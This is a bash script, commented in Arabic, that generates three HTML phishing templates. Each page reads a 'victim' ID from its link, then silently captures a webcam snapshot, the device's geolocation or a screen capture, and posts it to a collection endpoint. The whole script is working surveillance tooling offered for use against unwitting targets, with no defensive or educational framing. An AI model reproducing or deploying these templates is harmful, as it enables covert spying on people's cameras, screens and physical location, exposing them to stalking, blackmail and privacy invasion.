#!/bin/bash

TEMPLATE_DIR="templates"

# تأكد أن مجلد templates موجود
if [ ! -d "$TEMPLATE_DIR" ]; then
  echo "📁 مجلد $TEMPLATE_DIR غير موجود. يتم إنشاؤه..."
  mkdir -p "$TEMPLATE_DIR"
fi

# حذف الملفات القديمة
echo "🧹 حذف الملفات القديمة..."
rm -f "$TEMPLATE_DIR"/camera.html "$TEMPLATE_DIR"/geo.html "$TEMPLATE_DIR"/screenshare.html

# إنشاء camera.html
cat > "$TEMPLATE_DIR/camera.html" <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Camera Access</title>
</head>
<body>
  <h2>📸 Camera Capture</h2>
  <video id="video" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const victimId = urlParams.get('victim');

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      document.getElementById('video').srcObject = stream;

      setTimeout(() => {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('file', blob, 'capture.jpg');
          formData.append('victim', victimId);

          fetch('/api/camera', { method: 'POST', body: formData });
        }, 'image/jpeg');
      }, 3000);
    });
  </script>
</body>
</html>
EOF

# إنشاء geo.html
cat > "$TEMPLATE_DIR/geo.html" <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Geolocation</title>
</head>
<body>
  <h2>📍 Sending Geolocation</h2>
  <script>
    const victimId = new URLSearchParams(window.location.search).get('victim');
    navigator.geolocation.getCurrentPosition(pos => {
      fetch('/api/geo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          victim: victimId,
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        })
      });
    });
  </script>
</body>
</html>
EOF

# إنشاء screenshare.html
cat > "$TEMPLATE_DIR/screenshare.html" <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Screen Share</title>
</head>
<body>
  <h2>🖥️ Capturing Screen</h2>
  <video id="screen" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <script>
    const victimId = new URLSearchParams(window.location.search).get('victim');

    navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
      document.getElementById('screen').srcObject = stream;

      setTimeout(() => {
        const video = document.getElementById('screen');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('file', blob, 'screen.jpg');
          formData.append('victim', victimId);

          fetch('/api/screenshare', { method: 'POST', body: formData });
        }, 'image/jpeg');
      }, 3000);
    });
  </script>
</body>
</html>
EOF

echo "✅ تم إنشاء الملفات بنجاح في مجلد templates/"
